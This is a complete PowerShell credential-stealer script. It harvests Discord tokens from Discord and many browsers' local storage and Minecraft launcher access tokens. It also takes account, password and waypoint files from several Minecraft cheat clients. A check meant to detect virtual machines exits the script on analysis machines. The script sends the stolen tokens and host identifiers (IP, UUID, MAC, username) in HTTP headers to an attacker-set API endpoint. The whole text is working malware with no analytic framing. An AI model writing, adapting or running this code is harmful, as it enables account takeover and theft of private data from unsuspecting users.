$api="" #Set the API URL(repl.it/glitch nodeJS server needed)
$roaming=$env:APPDATA
$local=$env:LOCALAPPDATA
$db_path=@("$roaming\Discord\Local Storage\leveldb","$roaming\discordcanary\Local Storage\leveldb","$roaming\discordptb\Local Storage\leveldb","$roaming\Lightcord\Local Storage\leveldb","$roaming\DiscordDevelopment\Local Storage\leveldb","$roaming\Opera Software\Opera Stable\Local Storage\leveldb","$roaming\Opera Software\Opera GX Stable\Local Storage\leveldb","$local\Amigo\User Data\Local Storage\leveldb","$local\Torch\User Data\Local Storage\leveldb","$local\Kometa\User Data\Local Storage\leveldb","$local\Orbitum\User Data\Local Storage\leveldb","$local\CentBrowser\User Data\Local Storage\leveldb","$local\7Star\7Star\User Data\Local Storage\leveldb","$local\Sputnik\Sputnik\User Data\Local Storage\leveldb","$local\Vivaldi\User Data\Default\Local Storage\leveldb","$local\Google\Chrome SxS\User Data\Local Storage\leveldb","$local\Epic Privacy Browser\User Data\Local Storage\leveldb","$local\Google\Chrome\User Data\Default\Local Storage\leveldb","$local\uCozMedia\Uran\User Data\Default\Local Storage\leveldb","$local\Microsoft\Edge\User Data\Default\Local Storage\leveldb","$local\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb","$local\Opera Software\Opera Neon\User Data\Default\Local Storage\leveldb","$local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb")
$vmcheck = Get-WmiObject -Query "Select * From Win32_CacheMemory"
if (!$vmcheck) {Stop-Process -Id $pid -Force} else {
    $token = new-object System.Collections.Specialized.StringCollection
    foreach ($path in $db_path) {
        if (Test-Path $path) {
            try {
                foreach ($file in Get-ChildItem -Path $path -Name) {
                    $data = Get-Content -Path "$($path)\$($file)" -ErrorAction SilentlyContinue -Force
                    $regex = [regex] "[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"
                    $match = $regex.Match($data)
                    while ($match.Success) {
                        if (!$token.Contains($match.Value)) {
                            $token.Add($match.Value) | out-null
                        }
                    $match = $match.NextMatch()
                    }
                }
            } catch {Out-Null -ErrorAction SilentlyContinue}
        }
    }
    $ip = (Invoke-RestMethod -Uri "http://ipwhois.app/json/" -Method GET).ip
    $uuid = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
    $guid = ([guid]::NewGuid().guid).split("`n")[0]
    $mac = (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress[0]
    $cpu = (Get-CimInstance -ClassName 'Win32_Processor' | Select-Object -First '1').Name
    $localip = [net.dns]::GetHostAddresses("") | Select-Object -Expa IP*
    foreach ($ips in $localip) {
        $locip = [string]::Concat($locip, "&&", $ips)
    }
    foreach ($data in $token) {
        $tokens = @{
            token=$data
            ip = $ip
            uuid = $uuid
            guid = $guid
            mac = $mac
            cpu = $cpu
            localip = $locip
            username = $env:USERNAME
            pcname = $env:COMPUTERNAME
            os = $env:OS
        }
        Invoke-RestMethod -Uri "$api/tkns" -Method Post -Headers $tokens -UseBasicParsing -ErrorAction SilentlyContinue
    }
    if (Test-Path -LiteralPath "$roaming/.minecraft/") {
        $minecraft = "$roaming/.minecraft"
        $mcfile = (Get-Content "$minecraft/launcher_accounts.json"|ConvertFrom-Json)
        $locid = $mcfile.activeAccountLocalID
        $jsonObj = $mcfile.accounts.$locid
        $mcreq = @{
            mclocid = $locid
            mcusr = $jsonObj.minecraftProfile.name
            mcid = $jsonObj.minecraftProfile.id
            mctype = $jsonObj.type
            mclauncherusr = $jsonObj.username
            mcremoteId = $jsonObj.remoteId
            mclegacy = $jsonObj.legacy
            mcmigration = $jsonObj.eligibleForMigration
            mcmultiprof = $jsonObj.hasMultipleProfiles
            mcpersistent = $jsonObj.persistent
            mctoken = $jsonObj.accessToken
            mctokenExpires = $jsonObj.accessTokenExpiresAt
            mcavatar = $jsonObj.avatar
        }
        Invoke-RestMethod -Uri "$api/mcaccount" -Method Post -Headers $mcreq -UseBasicParsing -ErrorAction SilentlyContinue
        if (Test-Path -LiteralPath "$env:USERPROFILE/Future") {
            $futureWaypoints = Get-Content -path "$env:USERPROFILE/Future/waypoints.txt"
            $futureAlts = Get-Content -path "$env:USERPROFILE/Future/accounts.txt"
            foreach($way in $futureWaypoints) {
                $futureways = [string]::Concat($futureways, "&&", $way)
            }
        }
        if (Test-Path -LiteralPath "$minecraft/rusherhack") {
            $rhAlts = Get-Content -path "$minecraft/rusherhack/alts.json"
            $rhWaypoints = Get-Content -path "$minecraft/rusherhack/waypoints.json"
        }
        if (Test-Path -LiteralPath "$minecraft/konas") {
            $konasAlts = Get-Content -path "$minecraft/konas/accounts.json"
            $konasWaypoints = Get-Content -path "$minecraft/konas/waypoints.json"
        }
        if (Test-Path -LiteralPath "$minecraft/Remix/UID.txt") {
            $uid = Get-Content -Path "$minecraft/Remix/UID.txt"
            $remixAlts = Get-Content -path "$minecraft/Remix/Accounts.txt"
        }
        if (Test-Path -LiteralPath "$minecraft/pyro") {
            $pyropass = (Get-Content -Path "$minecraft/pyro/launcher.json"|ConvertFrom-Json).password
            $pyrousr = (Get-Content -Path "$minecraft/pyro/launcher.json"|ConvertFrom-Json).username
        }
        $paidclients = @{
            remixUid = $uid
            remixAlts = $remixAlts
            futureWay = $futureways
            futureAlts = $futureAlts
            rhway = $rhWaypoints
            rhalts = $rhAlts
            konasWay = $konasWaypoints
            konasalts = $konasAlts
            pyropass = $pyropass
            pyrousr = $pyrousr
        }
        Invoke-RestMethod -Uri "$api/clients" -Method Post -Headers $paidclients -UseBasicParsing -ErrorAction SilentlyContinue
    }
}